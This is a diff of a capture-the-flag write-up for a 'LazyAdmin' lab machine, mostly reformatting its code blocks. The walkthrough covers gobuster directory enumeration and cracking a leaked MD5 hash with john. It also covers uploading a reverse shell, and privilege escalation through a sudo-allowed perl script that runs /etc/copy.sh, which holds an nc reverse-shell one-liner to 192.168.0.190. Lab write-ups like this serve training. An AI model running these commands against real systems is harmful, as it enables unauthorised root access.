@@ -56,10 +56,8 @@ RUN Gobuster on MACHINE_IP/content
 ```bash
 gobuster dir -u http://lazyadmin.com/content -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 35
 ```
+
 ```
-/inc
-```
-```bash
 OPEN AT BROSWER MACHINE_IP/content/inc
 ```
 ```
@@ -75,17 +73,20 @@ we will see a folder named mysql_backup, navigate to mysql_backup and download t
 We can see that username is manager and password is hashed
 ```
 ```bash
-run hash-identifier to find out hash type it is MD5
+hash-identifier 
+to find out hash type it is MD5
 ```
 ```bash
 echo 42f749ade7f9e195bf475f37a44cafcb > hash.txt
+```
+```bash
 john hash.txt --format=RAW-MD5 --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ```creds
 We get Password
 ```
-```bash
+```
 We find login page at MACHINE_IP/content/as in browser, Login with the username and password.
 ```
 GOTO to media center ADS and upload the reverse shell if you dont have you can download it from the link below
@@ -104,8 +105,9 @@ python -c "import pty; pty.spawn('/bin/bash')"
 ```
 This command is used to spawn a tty terminal, move to /home/itguy
 
-```
-cat user.txt We get the first flag. TASK-1 Completed..!!
+```bash
+cat user.txt 
+We get the first flag. TASK-1 Completed..!!
 ```
 
 TASK-2 ROOT FLAG
@@ -113,8 +115,9 @@ TASK-2 ROOT FLAG
 ## Privilege Escalation
 
 
-```
-cat backup.pl, its a perl script
+```bash
+cat backup.pl
+Its a perl script.
 #!/usr/bin/perl
 
 system("sh", "/etc/copy.sh");
@@ -128,7 +131,7 @@ cat /etc/copy.sh
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
 we cant run this..
 ```
-```
+```bash
 sudo -l
 we can run this : /usr/bin/perl /home/itguy/backup.pl
 that is copy.sh needs to be modified for reverse shell
@@ -142,6 +145,6 @@ sudo /usr/bin/perl /home/itguy/backup.pl
 ```
 ```bash
 whoami
+```
 we are root user, navigate to root and you can find root.txt, cat it to get root flag
 TASK-2 Completed..!!
-```
